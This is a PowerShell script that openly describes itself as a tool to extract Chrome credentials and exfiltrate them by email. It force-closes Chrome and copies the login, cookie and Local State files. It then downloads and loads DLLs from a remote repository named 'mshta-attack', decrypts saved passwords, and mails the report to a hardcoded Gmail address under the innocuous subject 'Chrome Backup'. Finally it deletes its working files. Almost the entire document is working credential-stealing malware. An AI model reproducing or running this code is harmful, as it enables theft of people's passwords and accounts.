<#
.SYNOPSIS
  Extracts Chrome credentials and exfiltrates them via email.
.PARAMETER ChromeProfilePath
  Path to Chrome 'Default' profile folder.
.PARAMETER OutputRoot
  Directory for temporary output.
.PARAMETER SqliteDllUrl
  URL for the SQLite DLL.
.PARAMETER BouncyCastleDllUrl
  URL for the BouncyCastle DLL.
.PARAMETER SmtpServer
  SMTP server for exfiltration.
.PARAMETER SmtpPort
  Port number for SMTP.
.PARAMETER FromAddress
  Sender email address.
.PARAMETER ToAddress
  Recipient email address.
.PARAMETER SmtpPassword
  Plain-text SMTP password (converted to SecureString internally).
#>

param(
  [string]      $ChromeProfilePath     = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
  [string]      $OutputRoot            = "$env:TEMP",
  [string]      $SqliteDllUrl          = "https://raw.githubusercontent.com/someoneee0/mshta-attack/main/System.Data.SQLite.NETStandard.dll",
  [string]      $BouncyCastleDllUrl    = "https://raw.githubusercontent.com/someoneee0/mshta-attack/main/BouncyCastle.Crypto.dll",
  [string]      $SmtpServer            = "smtp.gmail.com",
  [int]         $SmtpPort              = 587,
  [string]      $FromAddress           = "bybit.pcex@gmail.com",
  [string]      $ToAddress             = "nopebye0001@gmail.com",
  [Parameter(Mandatory)]
  [SecureString]$SmtpPassword
)

# Stop on all errors
$ErrorActionPreference = 'Stop'
Start-Transcript -Path (Join-Path $OutputRoot 'chrome_debug.log') -Force

function Log($message) {
  Add-Content -Path (Join-Path $OutputRoot 'chrome_debug.log') -Value "$(Get-Date -Format 's') - $message"
}

function Load-Dlls {
  param($dest)
  $dllMap = @{
    'System.Data.SQLite' = $SqliteDllUrl;
    'BouncyCastle'       = $BouncyCastleDllUrl
  }
  foreach ($key in $dllMap.Keys) {
    try {
      $path = Join-Path $dest "$key.dll"
      Invoke-WebRequest -Uri $dllMap[$key] -OutFile $path -UseBasicParsing
      [Reflection.Assembly]::LoadFile($path) | Out-Null
      Log "Loaded $key.dll"
    } catch {
      Log "Error loading $key.dll: $_"
    }
  }
}

function Copy-ChromeData {
  param($profile, $dest)
  try {
    taskkill /IM chrome.exe /F | Out-Null
    Start-Sleep -Milliseconds 500
    New-Item -Path $dest -ItemType Directory -Force | Out-Null
    Copy-Item -Path (Join-Path $profile 'Login Data') -Destination $dest -Force
    Copy-Item -Path (Join-Path $profile 'Cookies')    -Destination $dest -Force
    Copy-Item -Path (Join-Path (Split-Path $profile -Parent) 'Local State') -Destination $dest -Force
    Log 'Chrome data copied'
  } catch {
    Log "Copy error: $_"
  }
}

function Get-Passwords {
  param($dbPath)
  $list = [System.Collections.Generic.List[string]]::new()
  try {
    $conn = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$dbPath"
    $conn.Open()
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = 'SELECT origin_url, username_value, password_value FROM logins'
    $reader = $cmd.ExecuteReader()
    while ($reader.Read()) {
      $bytes    = $reader.GetValue(2)
      $plain    = [Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, 'CurrentUser')
      $password = [Text.Encoding]::UTF8.GetString($plain)
      $list.Add("$($reader.GetString(0)) | $($reader.GetString(1)) | $password")
    }
    $conn.Close()
  } catch {
    Log "Password extract error: $_"
  }
  return $list
}

function Get-Cookies {
  param($cookieDb, $localStatePath)
  # Full cookie decryption logic goes here, using BouncyCastle if needed.
  return @()
}

function Send-Report {
  param($reportPath)
  try {
    $cred = New-Object System.Management.Automation.PSCredential($FromAddress, $SmtpPassword)
    Send-MailMessage -From $FromAddress -To $ToAddress ` 
      -Subject ('Chrome Backup ' + (Get-Date -Format 'HH:mm')) ` 
      -Body 'Automatic report' -Attachments $reportPath ` 
      -SmtpServer $SmtpServer -Port $SmtpPort -UseSsl -Credential $cred
    Log 'Report sent'
  } catch {
    Log "Send error: $_"
  }
}

function Cleanup {
  param($dir)
  try {
    Remove-Item -Path $dir -Recurse -Force -ErrorAction SilentlyContinue
    Log 'Cleaned up'
  } catch {
    # ignore cleanup failures
  }
}

# Main workflow
try {
  $destDir = Join-Path $OutputRoot ('chrome_' + (Get-Date).ToString('yyyyMMddHHmmss'))
  Copy-ChromeData -profile $ChromeProfilePath -dest $destDir
  Load-Dlls       -dest $destDir

  $passwords = Get-Passwords -dbPath (Join-Path $destDir 'Login Data')
  $cookies   = Get-Cookies    -cookieDb (Join-Path $destDir 'Cookies') -localStatePath (Join-Path $destDir 'Local State')

  $report = Join-Path $destDir 'report.txt'
  "=== PASSWORDS ===`n$($passwords -join "`n")`n`n=== COOKIES ===`n$($cookies -join "`n")" |
    Out-File -FilePath $report -Force

  Send-Report -reportPath $report
} finally {
  Cleanup -dir $destDir
  Stop-Transcript
}
